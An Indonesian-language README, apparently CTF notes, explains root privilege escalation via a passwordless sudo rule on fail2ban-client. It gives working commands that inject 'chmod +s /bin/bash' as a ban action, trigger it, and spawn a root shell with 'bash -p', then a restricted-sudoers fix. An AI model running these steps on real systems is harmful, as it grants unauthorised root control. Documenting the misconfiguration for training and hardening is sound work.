# Linux Privilege Escalation via Fail2ban-Client (Sudo Misconfiguration)

Repositori ini berisi catatan dokumentasi mengenai cara mengeksploitasi celah keamanan kesalahan konfigurasi (`sudo` misconfiguration) pada utilitas `fail2ban-client` untuk mendapatkan akses **Root** (Privilege Escalation).

---

## 🔑 Akar Masalah (Root Cause)
Celah keamanan ini terjadi ketika administrator server memberikan hak akses penuh kepada pengguna biasa untuk menjalankan `fail2ban-client` sebagai `root` tanpa password melalui file `/etc/sudoers`:

```bash
# Output dari sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Meskipun `fail2ban-client` adalah alat manajemen bawaan untuk memblokir IP, utilitas ini memiliki fitur *runtime* untuk mengubah atau menambahkan instruksi tindakan (`actionban`) baru secara dinamis. Jika dijalankan dengan `sudo`, perintah baru tersebut akan dieksekusi oleh sistem sebagai **Root**.

---

## 🚀 Alur & Langkah Eksploitasi

### 1. Membuat Action Baru
Membuat objek tindakan kustom baru bernama `evil` di bawah pengawasan jail `sshd`.
```bash
sudo /usr/bin/fail2ban-client set sshd addaction evil
```

### 2. Menyuntikkan Perintah SUID (Payload)
Memasukkan perintah jahat ke dalam parameter `actionban` milik objek `evil`. Perintah ini akan mengaktifkan bit SUID pada biner Bash sistem.
```bash
sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
```

### 3. Memicu Eksekusi (Trigger)
Memaksa Fail2ban memblokir IP sembarang secara manual agar sistem menjalankan instruksi `evil` yang baru saja dibuat menggunakan hak akses Root.
```bash
sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4
```

### 4. Spawning Root Shell
Menjalankan Bash dengan mode *privileged* (`-p`) untuk mempertahankan hak akses SUID yang telah aktif.
```bash
bash -p
```
*Hasil: Terminal akan berubah menjadi `#` (Akses Root Penuh).*

---

## 🛡️ Cara Perbaikan (Remediasi)
Jangan pernah memberikan hak akses `sudo` penuh secara mentah pada biner `fail2ban-client` kepada pengguna biasa. Jika pengguna hanya butuh melihat status pemblokiran, batasi perintahnya secara spesifik di file `/etc/sudoers`:

```text
# Batasi hanya untuk melihat status, tidak bisa memodifikasi parameter runtime
asterisk ALL=(ALL) NOPASSWD: /usr/bin/fail2ban-client status *, /usr/bin/fail2ban-client get *
```

---
> **Disclaimer:** Catatan ini dibuat murni untuk keperluan edukasi, dokumentasi kompetisi CTF, dan pengujian penetrasi resmi (*ethical hacking*).
